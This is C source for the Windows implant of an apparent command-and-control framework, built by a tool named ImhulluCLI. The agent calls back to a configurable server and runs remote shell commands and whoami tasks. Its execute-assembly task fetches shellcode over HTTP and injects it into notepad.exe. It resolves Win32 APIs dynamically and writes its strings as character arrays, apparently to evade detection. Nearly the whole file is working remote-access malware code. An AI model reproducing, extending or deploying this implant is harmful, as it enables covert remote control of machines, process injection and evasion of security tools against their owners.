#include "../include/agent.h"
#include "../include/std.h"
#include "../include/typedefs.h"
#include "../include/http.h"
#include "../include/addresshunter.h"

// will be overwritten by ImhulluCLI
// ImhulluCLI defines these macros when it compiles the agent
// these are here just so IDEs don't complain.
#ifndef SERVER_M
#define SERVER_M '1','9','2','.','1','6','8','.','0','.','1',0
#endif
#ifndef PORT_M
#define PORT_M 5001
#endif
#ifndef UUID_M
#define UUID_M '1','1','e','3','b','2','7','c','-','a','1','e','7','-','4','2','2','4','-','b','4','d','9','-','3','a','f','3','6','f','a','2','f','0','d','0',0
#endif

/**
 * @fn Agent* AgentAllocate
 *
 * @brief Allocates memory for an Agent structure on heap and its magic byte.
 *
 * @param MALLOC malloc: a pointer to the malloc function
 *
 * @return Agent*: a pointer to the allocated Agent structure
 *                 this will be set to NULL if allocation fails.
 *
 * @see AgentCreate()
 * @see AgentFree()
 *
 * @note If allocation fails, the return value is NULL
 * @note Populate the struct members with `AgentPopulate` and free the agent with `AgentFree`
 * @note `api` must have the `malloc` function initialized
 */
Agent* AgentAllocate(MALLOC malloc)
{
    /*
    if (malloc == 0) {
        DEBUG_PRINTF_ERROR("%s", "AgentAllocate: malloc is not defined\n");
        return NULL;
    }
    */

    Agent* agent = malloc(sizeof(Agent));

    /*
    if (agent == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentAllocate: Allocation of agent failed\n");
        return NULL;
    }
    */

    return agent;
}


/**
 * @fn BOOL AgentPopulate
 *
 * @brief Populates an agent's members and sets its magic byte.
 *
 * @param _In_ Agent* agent: a pointer to an agent that will be populated
 * @param _In_ CONST WCHAR remoteServer[REMOTE_SERVER_MAX_LENGTH]: a null terminated WCHAR array that the agent will connect to
 * @param _In_ CONST SIZE_T remoteServerLength: the length of the `remoteServer` string including the null terminator
 * @param _In_ CONST INTERNET_PORT remotePort: the server port to connect to
 * @param _In_ CONST AGENT_INTERVAL interval: the interval in between server callbacks
 *
 * @return BOOL: TRUE if population is successful
 *               FALSE if population fails
 *
 * @note Ensure that the `agent` pointer is valid and points to an allocated `Agent` structure before calling this function.
 *
 * @see AgentAllocate()
 * @see AgentFree()
 *
 * @note If population of a member fails, the function returns FALSE and all the members are considered uninitialized
 * @note Allocate the struct with `AgentAllocate` and free the agent with `AgentFree`
 */
BOOL AgentPopulate(_In_ Agent* agent, _In_ CONST WCHAR remoteServer[AGENT_REMOTE_SERVER_MAX_LENGTH], _In_ CONST SIZE_T remoteServerLength, _In_ CONST INTERNET_PORT remotePort, _In_ CONST AGENT_INTERVAL interval)
{
    /* DEBUG_PRINTF_ERROR doesn't work before populating the api member of Agent
    // if agent pointer is NULL, exit
    if (agent == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentPopulate: agent is NULL\n");
        return FALSE;
    }
    */

    // Set the api first so that things that depend on it such as DEBUG_PRINTF_ERROR works
    if (AgentApiSet(agent) == FALSE)
    {
        //DEBUG_PRINTF_ERROR("%s", "AgentPopulate: AgentApiSet failed\n");
        return FALSE;
    }

    agent->_magic = AGENT_MAGIC;

    // if remoteServer is NULL, exit
    if (remoteServer == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentPopulate: remoteServer is NULL\n");
        return FALSE;
    }

    // if remoteServerLength is more than the allowed length, exit
    if (remoteServerLength > AGENT_REMOTE_SERVER_MAX_LENGTH)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentPopulate: remoteServerLength is more than AGENT_REMOTE_SERVER_MAX_LENGTH\n");
        return FALSE;
    }

    if (AgentRemoteServerSet(agent, remoteServer, remoteServerLength) == FALSE)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentPopulate: AgentRemoteServerSet failed\n");
        return FALSE;
    }

    // populate _remotePort
    if (AgentRemotePortSet(agent, remotePort) == FALSE)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentPopulate: AgentRemotePortSet failed\n");
        return FALSE;
    }

    if (AgentIntervalSet(agent, interval) == FALSE)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentPopulate: AgentIntervalSet failed\n");
        return FALSE;
    }

    return TRUE;
}


/**
 * @fn VOID AgentFree
 *
 * @brief Frees the memory allocated for an Agent structure.
 *
 * @param _In_ Agent* agent: A pointer to the Agent structure to be freed.
 *
 * @return BOOL: TRUE if freeing is successful
 *               FALSE if freeing fails
 *
 * @note Ensure that the pointer passed to this function is on heap.
 *
 * @see AgentAllocate()
 * @see AgentCreate()
 *
 * @note Allocate the struct with `AgentAllocate` and populate the struct with `AgentPopulate`
 */
BOOL AgentFree(_In_ Agent* agent)
{
    if (agent->api.malloc == 0) {
        DEBUG_PRINTF_ERROR("%s", "agent->api.malloc is 0\n");
        return FALSE;
    }

    ((FREE)agent->api.free)(agent);

    return TRUE;
}


/**
 * @fn BOOL AgentRemoteServerSet
 *
 * @brief Change the RemoteServer member of the agent
 *
 * @param _Inout_ Agent* agent: the agent whose member `_remoteServer` will be changed
 *                             if function fails, `_remoteServer` isn't changed
 * @param _In_ WCHAR remoteServer[REMOTE_SERVER_MAX_LENGTH]: a null terminated WCHAR array that the agent will connect to
 * @param _In_ SIZE_T remoteServerLength: the length of the `remoteServer` string including the null terminator
 *
 * @return If function suceeds TRUE
 *         If function fails FALSE
 *
 * @note: If the function fails, the _remoteServer member remains unchanged
 */
BOOL AgentRemoteServerSet(_Inout_ Agent* agent, _In_ CONST WCHAR remoteServer[AGENT_REMOTE_SERVER_MAX_LENGTH], _In_ CONST SIZE_T remoteServerLength)
{
    // if agent pointer is NULL, exit
    if (agent == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentRemoteServerSet: agent is NULL\n");
        return FALSE;
    }

    if (agent->_magic != AGENT_MAGIC)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentRemoteServerSet: agent is not valid\n");
        return FALSE;
    }

    if (agent->_magic != AGENT_MAGIC)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentRemoteServerSet: agent is not valid\n");
        return FALSE;
    }

    // Check if remoteServer pointer is NULL
    if (remoteServer == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentRemoteServerSet: remoteServer is NULL\n");
        return FALSE;
    }

    // if remoteServerLength is more than the allowed length, exit
    if (remoteServerLength > AGENT_REMOTE_SERVER_MAX_LENGTH)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentRemoteServerSet: remoteServerLength is higher than AGENT_REMOTE_SERVER_MAX_LENGTH\n");
        return FALSE;
    }

    // populate _remoteServer
    int i = 0;
    for (i = 0; i<remoteServerLength && i<AGENT_REMOTE_SERVER_MAX_LENGTH-1; i++)
    {
        agent->_remoteServer[i] = remoteServer[i];
    }

    // ensure we aren't writing out-of-bound
    if (i == 0) {
        agent->_remoteServer[0] = L'\0'; // Handle case where no characters were copied
        DEBUG_PRINTF_WARNING("%s", "AgentRemoteServerSet: remoteServer is empty");
    } else {
        // ensure null termination, override the last byte as it is meant to be a null terminator
        // this checks for the chance that remoteServerLength is less than the actual size of remoteServer
        // which would cause our string to be unterminated since we didn't copy the null byte
        agent->_remoteServer[i-1] = L'\0';
    }
    return TRUE;
}


/**
 * @fn BOOL AgentRemotePortSet
 *
 * @brief Change the RemotePort member of the agent
 *
 * @param _Inout_ Agent* agent: the agent whose member `_remotePort` will be changed
 *                             if function fails, `_remotePort` isn't changed
 * @param _In_ INTERNET_PORT remotePort: the port the agent will connect to
 *
 * @return If function suceeds TRUE
 *         If function fails FALSE
 *
 * @note: make sure remotePort is between 1-65535
 * @note: If the function fails, the _remotePort member remains unchanged
 */
BOOL AgentRemotePortSet(_Inout_ Agent* agent, _In_ INTERNET_PORT remotePort)
{
    if (agent == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentRemotePortSet: agent is null\n");
        return FALSE;
    }

    if (agent->_magic != AGENT_MAGIC)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentRemotePortSet: agent is not valid\n");
        return FALSE;
    }

    if (remotePort<1 || remotePort>65535)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentRemotePortSet: remotePort is not in between 1-65535\n");
        return FALSE;
    }

    agent->_remotePort = remotePort;

    return TRUE;
}


/**
 * @fn BOOL AgentIntervalSet
 *
 * @brief Change the `_interval` member of the agent
 *
 * @param _Inout_ Agent* agent: the agent whose `_interval` member will be changed
 *                             if function fails, the interval isn't changed
 * @param _In_ AGENT_INTERVAL: a positive value that will be the interval in milliseconds
 *
 * @return If function succeeds, TRUE
 *         If function fails, FALSE
 *
 * @note If the function fails, the interval remains unchanged
 */
BOOL AgentIntervalSet(_Inout_ Agent* agent, _In_ AGENT_INTERVAL interval)
{
    if (agent == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentIntervalSet: agent is NULL\n");
        return FALSE;
    }

    if (agent->_magic != AGENT_MAGIC)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentIntervalSet: agent is not valid\n");
        return FALSE;
    }
    
    if (interval < 0)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentIntervalSet: interval is less than 0\n");
        return FALSE;
    }

    agent->_interval = interval;

    return TRUE;
}


/**
 * @fn BOOL AgentApiSet
 *
 * @brief Set the api member of the agent
 *
 * @param _Out_ Agent* agent: the agent whose member `api` will be changed
 *                             if function fails, `api` isn't changed
 * @param _In_ PAPI api: a pointer to the struct that has dynamically imported Win32 api calls
 *
 * @return If function suceeds TRUE
 *         If function fails FALSE
 *
 * @note: make sure Win32 api functions in `api` is initialized
 * @note: If the function fails, the `api` member remains unchanged
 */
BOOL AgentApiSet(_Out_ Agent* agent)
{
    /* Debugs don't work without populating the api first
    if (agent == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentApiSet: agent is NULL\n");
        return FALSE;
    }
    */

    /*
    if (agent->_magic != AGENT_MAGIC)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentApiSet: agent is not valid\n");
        return FALSE;
    }
    */

    /*
    if (api == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentApiSet: api is NULL\n");
        return FALSE;
    }
    */

    agent->api = _populate_base_api();

    return TRUE;
}


/**
 * @fn BOOL AgentTaskMappingsSet
 *
 * @brief Set the `_taskMappings[]` member of the agent
 *
 * @param _Inout_ Agent* agent: the agent whose `_taskMappings` member will be set
 *                             if function fails, the interval isn't changed
 * @param _In_ CONST TaskMapping taskMappings[]: an array of taskMappings
 * @param _In_ CONST DWORD dwNumberOfTaskMappings: the number of TaskMapping structs inside taskMappings
 *
 * @return If function succeeds, TRUE
 *         If function fails, FALSE
 *
 * @note If the function fails, the `_taskMappings` member remains unchanged
 */
/*
BOOL AgentTaskMappingsSet(_Inout_ Agent* agent, _In_ CONST TaskMapping taskMappings[MAX_TASK_MAPPINGS], _In_ CONST DWORD dwNumberOfTaskMappings)
{
    if (agent == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentTaskMappingsSet: agent is NULL\n");
        return FALSE;
    }
    if (taskMappings == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentTaskMappingsSet: taskMappings is NULL\n");
        return FALSE;
    }
    if (dwNumberOfTaskMappings == 0)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentTaskMappingsSet: dwNumberOfTaskMappings is 0\n");
        return FALSE;
    }
    if (dwNumberOfTaskMappings > MAX_TASK_MAPPINGS)
    {
        DEBUG_PRINTF_ERROR("%s", "AgentTaskMappingsSet: dwNumberOfTaskMappings is higher than MAX_TASK_MAPPINGS\n");
        return FALSE;

    }

    return TRUE;
}
*/


/**
 * @fn VOID AgentSleep
 *
 * @brief Suspend the execution of the current thread
 *
 * @param Agent* agent: The sleep time is stored in milliseconds in `agent->_interval`
 *
 * @return This function returns nothing
 */
VOID AgentSleep(_In_ PAPI api, _In_ Agent* agent)
{
    ((SLEEP)api->Sleep)(agent->_interval);
}


// NOTE: Does pEsgStdDll need to be freed upon shutdown?
/**
 * @fn VOID AgentExecuteTask
 *
 * @brief Executes a function and returns the result
 *
 * @param _In_ Agent* agent:
 * @param _In_ PESG_STD_API pEsgStdApi:
 * @param _Out_opt_ DLL* pEsgStdDll: pointer to the standard esg dll that may be freed if a Task requires so
 * @param _In_ Task task: a Task struct to use to run a task
 * @param _Out_ CHAR** taskResult: a double pointer to a buffer that receives the task result.
 *                                 this will be set to NULL if the execution fails or if there is no task to run.
 * @param _Out_ DWORD* pdwSizeOfOutput: a pointer to a dword value that will receive the size of the result
 *                                      the data pdwSizeOfOutput will be 0 if execution fails
 *
 * @return BOOL: TRUE if execution successful, FALSE if execution fails or if there is no task to run
 *
 * @note The caller is responsible for freeing the memory allocated for pTaskResult
 * @note If execution fails, the data pointed to by pdwSizeOfOutput is 0
 * @note If execution fails, the return is FALSE otherwise the return is TRUE.
 * @note If execution fails, the data pointed to by `pTaskResult` will be NULL. Ensure to check this before using the result.
 */
BOOL AgentExecuteTask(_In_ Agent* agent, _In_ PESG_STD_API pEsgStdApi, _Out_opt_ DLL* pEsgStdDll, _In_ Task task, _Out_ CHAR** pTaskResult, _Out_ DWORD* pdwSizeOfOutput)
{
    *pdwSizeOfOutput = 0;
    *pTaskResult = NULL;
    // if json is empty
    // readJsonTask returns a task struct with all fields equal to NULL
    if (task.taskId == NULL)
    {
        DEBUG_PRINTF_WARNING("%s", "AgentExecuteTask: task.taskId is null, probably no task present");
        return FALSE;
    }
    
    // NOTE: use IoC here?

    CHAR* orgOutput;  // on heap
    if (my_strcmp(task.taskType, TASK_CMD) == 0)
    {
        if (_AgentExecuteCmd(agent, pEsgStdApi, task, pTaskResult, pdwSizeOfOutput) == FALSE)
        {
            DEBUG_PRINTF_ERROR("%s", "AgentExecuteTask: _AgentExecuteCmd failed\n");
            return FALSE;
        }
        return TRUE;
    }
    else if (my_strcmp(task.taskType, TASK_WHOAMI) == 0)
    {
        if (_AgentExecuteWhoami(agent, pEsgStdApi, task, pTaskResult, pdwSizeOfOutput) == FALSE)
        {
            DEBUG_PRINTF_ERROR("%s", "AgentExecuteTask: _AgentExecuteWhoami failed\n");
            return FALSE;
        }
        return TRUE;
    }
    else if (my_strcmp(task.taskType, TASK_SHUTDOWN) == 0)
    {
        if (_AgentExecuteShutdown(agent, pEsgStdDll, task))
        {
            DEBUG_PRINTF_ERROR("%s", "AgentExecuteTask: _AgentExecuteShutdown failed\n");
            return FALSE;
        }
        return TRUE;
    }
    else if (my_strcmp(task.taskType, TASK_EXECUTE_ASSEMBLY) == 0)
    {
        if (_AgentExecuteAssembly(agent, pEsgStdApi, pTaskResult, pdwSizeOfOutput))
        {
            DEBUG_PRINTF_ERROR("%s", "AgentExecuteTask: _AgentExecuteAssembly failed\n");
            return FALSE;
        }
        return TRUE;
    }
    else
    {
        return FALSE;
    }
}

/**
 * @fn BOOL _AgentExecuteCmd
 *
 * @brief Executes a command in the task, and retrieves the result.
 *
 * This function takes a Task struct and pointers to the API and ESG_STD_API structs, executes the command associated
 * with the task, and returns the result of the execution. The result is provided as a string along with its size.
 * The function is a private function that should not be used outside agent.c
 *
 * @param _In_ Agent* agent: A pointer to the Agent strucutre
 * @param _In_ PESG_STD_API pEsgStdApi: A pointer to the ESG_STD_API structure with RunCmd initialized
 * @param _In_ Task task: The task to be executed, which contains the command details.
 * @param _Out_ CHAR** taskResult: A pointer to a character pointer that will receive the result of the command execution.
 * @param _Out_ DWORD* pdwSizeOfOutput: A pointer to a DWORD that will receive the size of the result.
 *
 * @return BOOL Returns TRUE if the command was executed successfully; otherwise, returns FALSE.
 *
 * @note Ensure that the pointers provided for taskResult and pdwSizeOfOutput are valid and allocated
 *       before calling this function. The caller is responsible for freeing the memory allocated for
 *       taskResult after use.
 */
BOOL _AgentExecuteCmd(_In_ Agent* agent, _In_ PESG_STD_API pEsgStdApi, _In_ Task task, _Out_ CHAR** taskResult, _Out_ DWORD* pdwSizeOfOutput)
{
    if (pEsgStdApi == NULL || taskResult == NULL || pdwSizeOfOutput == NULL) {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteCmd: Invalid parameters\n");
        return FALSE; // Invalid parameters
    }

    CHAR* orgOutput = NULL;  // on heap
    orgOutput = ((RUNCMD)pEsgStdApi->RunCmd)(task.taskParams, pdwSizeOfOutput);

    if (orgOutput == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteCmd: pEsgStdApi->RunCmd failed\n");
        return FALSE;
    }

    *taskResult = myTrim(&agent->api, orgOutput, '\n');

    ((FREE)agent->api.free)(orgOutput);
    orgOutput = NULL;

    if (*taskResult == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteCmd: myTrim returned null");
        return FALSE;
    }

    return TRUE;
}

/**
 * @fn BOOL _AgentExecuteWhoami
 *
 * @brief Executes GetUserNameA Win32 function, and retrieves the result.
 *
 * This function takes a Task struct and pointers to the API and ESG_STD_API structs, executes the task,
 * and returns the result of the execution. The result is provided as a string along with its size.
 * The function is a private function that should not be used outside of agent.c
 *
 * @param _In_ Agent* agent: A pointer to the Agent strucutre
 * @param _In_ PESG_STD_API pEsgStdApi: A pointer to the ESG_STD_API structure with RunCmd initialized
 * @param _In_ Task task: The task to be executed.
 * @param _Out_ CHAR** taskResult: A pointer to a character pointer that will receive the result of the task.
 * @param _Out_ DWORD* pdwSizeOfOutput: A pointer to a DWORD that will receive the size of the result.
 *
 * @return BOOL Returns TRUE if the task was executed successfully; otherwise, returns FALSE.
 *
 * @note Ensure that the pointers provided for taskResult and pdwSizeOfOutput are valid and allocated
 *       before calling this function. The caller is responsible for freeing the memory allocated for
 *       taskResult after use.
 */
BOOL _AgentExecuteWhoami(_In_ Agent* agent, _In_ PESG_STD_API pEsgStdApi, _In_ Task task, _Out_ CHAR** taskResult, _Out_ DWORD* pdwSizeOfOutput)
{
    *pdwSizeOfOutput = 0;

    if (pEsgStdApi == NULL || taskResult == NULL || pdwSizeOfOutput == NULL) {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteWhoami: Invalid parameters\n");
        return FALSE; // Invalid parameters
    }

    CHAR* orgOutput = NULL;  // on heap
    orgOutput = ((WHOAMI)pEsgStdApi->Whoami)(pdwSizeOfOutput);

    if (orgOutput == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteWhoami: pEsgStdApi->Whoami failed\n");
        return FALSE;
    }

    *taskResult = myTrim(&agent->api, orgOutput, '\n');

    ((FREE)agent->api.free)(orgOutput);
    orgOutput = NULL;

    if (*taskResult == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteWhoami: myTrim returned null");
        return FALSE;
    }

    return TRUE;
}


/**
 * @brief Executes the shutdown process for a given agent and task.
 *
 * This function constructs a JSON response containing the task ID, agent UUID,
 * and the encoded exit output. It then sends this JSON response to a specified
 * remote server and port associated with the agent. After sending the response,
 * it cleans up allocated resources and terminates the current thread.
 *
 * @param _In_ Agent* agent: A pointer to the Agent structure
 * @param _Out_ DLL* pEsgStdDll: A pointer to a DLL structure that will be freed and set to NULL after the operation
 * @param _In_ Task task: The Task structure that contains details about the task being executed
 *
 * @return BOOL Returns TRUE if the shutdown process was successful, otherwise returns FALSE.
 *
 * @note The DLL that gets freed shouldn't matter as the program shuts down after the function.
 *       However, it's still accounted for to be future proof.
 *
 */
BOOL _AgentExecuteShutdown(_In_ Agent* agent, _Out_ DLL* pEsgStdDll, _In_ Task task)
{
    if (agent == NULL || pEsgStdDll == NULL) {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteShutdown: Invalid parameters\n");
        return FALSE; // Invalid parameters
    }

    if (task.taskId == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteShutdown: task.taskId is NULL, indicates that the task is uninitialized or its creation has failed\n");
        return FALSE;
    }

    // json for the response
    CHAR jsonFormat[] =
    {
    '{', '"', 't', 'a', 's', 'k', '_', 'i', 'd', '"', ':', ' ', '"', '%', 's', '"', ',',
    ' ', '"', 'a', 'g', 'e', 'n', 't', '_', 'u', 'u', 'i', 'd', '"', ':', ' ', '"',
    '%', 's', '"', ',', ' ', '"', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p',
    'u', 't', '"', ':', ' ', '"', '%', 's', '"', '}', 0
    };
    WCHAR pathSendTaskOutput[] =
    {
        '/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u',
        't', '/', UUID_M
    };

    CONST DWORD dwEncodedExitOutputSize = 17;
    DWORD totalJsonSize = 0;
    CHAR* json = NULL;  // onheap
    // base64 value of exitSuccess
    CHAR encodedExitOutput[17] = { 'R', 'X', 'h', 'p', 'd', 'F', 'N', '1', 'Y', '2', 'N', 'l', 'c', '3', 'M', '=', 0 };
    totalJsonSize = myStrlenA(jsonFormat)-6 + dwEncodedExitOutputSize-1 + myStrlenA(task.taskId) + myStrlenA(task.agentUuid);
    json = (CHAR*)((CALLOC)agent->api.calloc)(totalJsonSize, sizeof(CHAR));

    if (json == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteShutdown: allocation for json has failed");
        return FALSE;
    }

    ((SNPRINTF)agent->api.snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.agentUuid, encodedExitOutput);
    PostRequest(&agent->api, agent->_remoteServer, agent->_remotePort, pathSendTaskOutput, json);

    ((FREE)agent->api.free)(pEsgStdDll->pBuffer);
    pEsgStdDll->pBuffer = NULL;
    ((FREE)agent->api.free)(json);
    json = NULL;
    ((FREE)agent->api.free)(task.taskParams);
    task.taskParams = NULL;

    // TODO: Change with ExitProcess
    ((EXITTHREAD)agent->api.ExitThread)(0);
    return TRUE;
}


/**
 * @fn BOOL _AgentExecuteAssembly
 *
 * @brief Executes an assembly injection into a specified application.
 *
 * This function retrieves executable shellcode from a remote server and injects
 * it into the Notepad application. It constructs the necessary parameters for
 * the injection process and allocates memory for the task result, which indicates
 * the execution status of the assembly.
 * // NOTE: The application to inject into should be obtained from the Agent struct
 *
 * @param _In_ Agent* agent: A pointer to the Agent structure that contains information about
 *                           the agent performing the assembly execution.
 * @param _In_ PESG_STD_API pEsgStdApi: A pointer to the standard API structure that contains the
 *                                      function for injecting code into a process.
 * @param _Out_ CHAR** pTaskResult: A pointer to a character pointer that will be allocated
 *                                  to store the result of the task execution.
 * @param _Out_ DWORD* pdwSizeOfOutput: A pointer to a DWORD value that receives the size of the
 *                                      allocated data for pTaskResult
 *
 * @return BOOL Returns TRUE if the assembly injection was initiated successfully,
 *               otherwise returns FALSE.
 *
 * @note The function assumes that Notepad is available at the specified path.
 *       It also allocates memory for the task result, which should be freed by
 *       the caller to avoid memory leaks.
 */
BOOL _AgentExecuteAssembly(_In_ Agent* agent, PESG_STD_API pEsgStdApi, CHAR** pTaskResult, DWORD* pdwSizeOfOutput)
{
    if (agent == NULL || pEsgStdApi == NULL || pTaskResult == NULL || pdwSizeOfOutput == NULL) {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteAssembly: Invalid parameters\n");
        return FALSE; // Invalid parameters
    }

    // use notepad.exe to inject code into
    CHAR lpApplicationName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
    DWORD dwShellcodeSize;
    WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
    LPVOID shellcode = httpGetExecutable(&agent->api, &dwShellcodeSize, cAssemblyEndpoint, agent->_remoteServer, agent->_remotePort);

    if (shellcode == NULL)
    {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteAssembly: httpGetExecutable failed\n");
        return FALSE;
    }

    if ( ((INJECTINTOPROCESS)pEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, (LPCSTR)lpApplicationName) == FALSE )
    {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteAssembly: calloc for *pTaskResult failed\n");
        return FALSE;
    }

    *pTaskResult = ((CALLOC)agent->api.calloc)(myStrlenA(TASK_EXECUTE_ASSEMBLY)+1, sizeof(CHAR));

    if (*pTaskResult == NULL) {
        DEBUG_PRINTF_ERROR("%s", "_AgentExecuteAssembly: calloc for *pTaskResult failed\n");
        return FALSE;
    }

    for (int i = 0; i < myStrlenA(TASK_EXECUTE_ASSEMBLY)+1; i++)
    {
        *pTaskResult[i] = TASK_EXECUTE_ASSEMBLY[i];
    }

    ((FREE)agent->api.free)(shellcode);
    return TRUE;
}

API _populate_base_api()
{
    API _api = {0};
    PAPI api = &_api;

    // Library Names
    CHAR user32_c[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0 };
    CHAR winhttp_c[] = { 'w', 'i', 'n', 'h', 't', 't', 'p', 0 };
    CHAR msvcrt_c[] = { 'm', 's', 'v', 'c', 'r', 't', 0 };
    CHAR crypt32_c[] = { 'c', 'r', 'y', 'p', 't', '3', '2', '.', 'd', 'l', 'l', 0 };
    CHAR shlwapi_c[] = { 's', 'h', 'l', 'w', 'a', 'p', 'i', '.', 'd', 'l', 'l', 0 };

    // Library Declarations
    UINT64 kernel32dll, winhttpdll, msvcrtdll, user32dll, crypt32dll, shlwapidll;

    // Function Names
    CHAR messageBoxA_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };
    CHAR messageBoxW_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'W', 0 };
    CHAR loadlibrarya_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
    CHAR winHttpOpen_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 0 };
    CHAR winHttpConnect_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', 0 };
    CHAR winHttpOpenRequest_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
    CHAR winHttpSendRequest_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
    CHAR winHttpReceiveResponse_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'c', 'e', 'i', 'v', 'e', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 0 };
    CHAR WinHttpQueryDataAvailable_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'D', 'a', 't', 'a', 'A', 'v', 'a', 'i', 'l', 'a', 'b', 'l', 'e', 0 };
    CHAR winHttpQueryHeaders_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', 's', 0 };
    CHAR winHttpReadData_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 0 };
    CHAR winHttpCloseHandle_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
    CHAR getLastError_c[] = {'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0 };
    #ifdef DEBUG
    CHAR wprintf_c[] = { 'w', 'p', 'r', 'i', 'n', 't', 'f', 0 };
    CHAR printf_c[] = { 'p', 'r', 'i', 'n', 't', 'f', 0 };
    #endif
    CHAR snprintf_c[] = { '_', 's', 'n', 'p', 'r', 'i', 'n', 't', 'f', 0 };
    CHAR malloc_c[] = { 'm', 'a', 'l', 'l', 'o', 'c', 0 };
    CHAR calloc_c[] = { 'c', 'a', 'l', 'l', 'o', 'c', 0 };
    CHAR free_c[] = { 'f', 'r', 'e', 'e', 0 };
    CHAR virtualProtect_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0 };
    CHAR virtualAlloc_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0 };
    CHAR createThread_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
    CHAR waitForSingleObject_c[] = { 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };
    CHAR CryptStringToBinaryA_c[] = { 'C', 'r', 'y', 'p', 't', 'S', 't', 'r', 'i', 'n', 'g', 'T', 'o', 'B', 'i', 'n', 'a', 'r', 'y', 'A', 0 };
    CHAR CryptBinaryToStringA_c[] = { 'C', 'r', 'y', 'p', 't', 'B', 'i', 'n', 'a', 'r', 'y', 'T', 'o', 'S', 't', 'r', 'i', 'n', 'g', 'A', 0 };
    CHAR StrToIntW_c[] = { 'S', 't', 'r', 'T', 'o', 'I', 'n', 't', 'W', 0 };
    CHAR closeHandle_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
    CHAR sleep_c[] = { 'S', 'l', 'e', 'e', 'p', 0 };
    CHAR exitThread_c[] = { 'E', 'x', 'i', 't', 'T', 'h', 'r', 'e', 'a', 'd', 0 };

    // Get Kernel32
    kernel32dll = GetKernel32();
    // GetLoadLibraryA
    api->LoadLibraryA = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);

    // Getting Libraries
